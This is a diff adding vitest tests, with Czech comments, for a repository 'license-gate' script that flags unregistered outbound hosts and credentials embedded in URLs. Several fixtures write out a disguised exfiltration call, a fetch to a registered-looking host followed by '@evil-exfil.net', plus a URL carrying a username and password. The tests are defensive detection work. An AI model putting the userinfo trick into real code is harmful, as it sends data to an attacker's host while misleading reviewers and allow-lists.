@@ -17,7 +17,7 @@ import { dirname, join } from 'node:path';
 import { afterAll, describe, expect, it } from 'vitest';
 
 import { findHits, parseList, verdict } from '../cleanroom-check.mjs';
-import { hostsIn, noticesFor, stripComments } from '../license-gate.mjs';
+import { credentialUrlsIn, hostsIn, noticesFor, stripComments } from '../license-gate.mjs';
 
 const LICENSE_GATE = join(process.cwd(), 'scripts', 'license-gate.mjs');
 const CLEANROOM = join(process.cwd(), 'scripts', 'cleanroom-check.mjs');
@@ -459,6 +459,62 @@ describe('license-gate: pokrytí (kontroly 3 a 5)', () => {
 
     expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([]);
   });
+
+  it('userinfo neskryje skutečný cíl — registrovaný host před @ bránu nepropustí', () => {
+    const dir = makeGreenRepo();
+    // `api.fixture-provider.io` JE v registru. Lexikální výřez se zastavil na `@`,
+    // takže se porovnával on a volání na `evil-exfil.net` prošlo zeleně.
+    write(dir, 'src/exfil.ts', "await fetch('https://api.fixture-provider.io@evil-exfil.net/v1/x');\n");
+
+    const { code, out } = run(LICENSE_GATE, dir);
+    expect(failedChecks(out)).toEqual([5]);
+    // **Musí to být řádek o neznámém HOSTU**, ne řádek o userinfo. Samotné
+    // `toContain('evil-exfil.net')` projde i lexikálnímu výřezu, protože ten host
+    // je i v hlášce o userinfo — a test by pak tvrdil něco, co neměří.
+    expect(out).toContain('evil-exfil.net (src/exfil.ts)');
+    expect(code).toBe(1);
+  });
+
+  it('userinfo je nález i tehdy, když host v registru je — a heslo se nevypíše', () => {
+    const dir = makeGreenRepo();
+    write(dir, 'src/creds.ts', "await fetch('https://honza:tajneheslo@api.fixture-provider.io/v1');\n");
+
+    const { code, out } = run(LICENSE_GATE, dir);
+    expect(failedChecks(out)).toEqual([5]);
+    expect(out).toContain('userinfo');
+    expect(out).toContain('***@api.fixture-provider.io');
+    expect(out).not.toContain('tajneheslo');
+    expect(out).not.toContain('honza');
+    expect(code).toBe(1);
+  });
+
+  it('regulární literál na řádku neoslepí kontrolu na zbytek toho řádku', () => {
+    const dir = makeGreenRepo();
+    // `\/\/` uvnitř literálu spustilo režim komentáře a zbytek řádku zmizel.
+    write(dir, 'src/regex.ts', "const r = /https:\\/\\//; const u = 'https://po-regexu.io/v1';\n");
+
+    const { code, out } = run(LICENSE_GATE, dir);
+    expect(failedChecks(out)).toEqual([5]);
+    expect(out).toContain('po-regexu.io');
+    expect(code).toBe(1);
+  });
+
+  it('nezaescapované // ve znakové třídě regexu taky neoslepí zbytek řádku', () => {
+    const dir = makeGreenRepo();
+    write(dir, 'src/klass.ts', "const r = /[//]/; const u = 'https://po-tride.io/v1';\n");
+
+    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([5]);
+  });
+
+  it('soubor .mts se skenuje stejně jako .ts', () => {
+    const dir = makeGreenRepo();
+    write(dir, 'src/edge.mts', "await fetch('https://jen-v-mts.io/v1');\n");
+
+    const { code, out } = run(LICENSE_GATE, dir);
+    expect(failedChecks(out)).toEqual([5]);
+    expect(out).toContain('jen-v-mts.io');
+    expect(code).toBe(1);
+  });
 });
 
 describe('license-gate: DISCLOSURE.md je výpis, ne text (kontrola 6)', () => {
@@ -490,6 +546,45 @@ describe('license-gate: čisté funkce', () => {
 
   it('stripComments neuřízne řetězec, který obsahuje //', () => {
     expect(stripComments("const u = 'https://a.io//b';\n")).toContain('a.io//b');
+  });
+
+  it('stripComments přeskočí regulární literál celý, ne po první lomítko', () => {
+    const stripped = stripComments("const r = /https:\\/\\//; const u = 'https://za-regexem.io/x';\n");
+    expect(stripped).toContain('za-regexem.io');
+  });
+
+  it('stripComments nepovažuje dělení za regulární literál', () => {
+    // Kdyby ano, spolkl by všechno až po další `/` a s tím i URL za ním.
+    const stripped = stripComments("const x = total / count; const u = 'https://po-deleni.io/x';\n");
+    expect(stripped).toContain('po-deleni.io');
+    expect(stripped).toContain('total / count');
+  });
+
+  it('stripComments pozná regulární literál i po klíčovém slově', () => {
+    const stripped = stripComments("function f() { return /a\\/\\/b/; }\nconst u = 'https://po-returnu.io/x';\n");
+    expect(stripped).toContain('po-returnu.io');
+  });
+
+  it('stripComments pořád zahodí řádkový komentář, který regexem nezačíná', () => {
+    const stripped = stripComments("const x = 1; // https://uvnitr-komentare.io/y\n");
+    expect(stripped).not.toContain('uvnitr-komentare.io');
+  });
+
+  it('hostsIn vrátí skutečný host, ne to, co stojí před @', () => {
+    expect([...hostsIn("fetch('https://api.openai.com@evil-exfil.net/v1');")]).toEqual(['evil-exfil.net']);
+  });
+
+  it('credentialUrlsIn nahlásí userinfo a nevypíše heslo', () => {
+    const found = [...credentialUrlsIn("fetch('https://honza:tajneheslo@sluzba.io/v1');")];
+    expect(found).toEqual(['https://***@sluzba.io/v1']);
+  });
+
+  it('credentialUrlsIn mlčí nad běžnou URL', () => {
+    expect([...credentialUrlsIn("fetch('https://sluzba.io/v1');")]).toEqual([]);
+  });
+
+  it('hostsIn nevymýšlí host u URL složené za běhu', () => {
+    expect([...hostsIn('fetch(`https://${provider}.example/v1`);')]).toEqual([]);
   });
 
   it('hostsIn vynechá loopback i jména vyhrazená pro dokumentaci', () => {
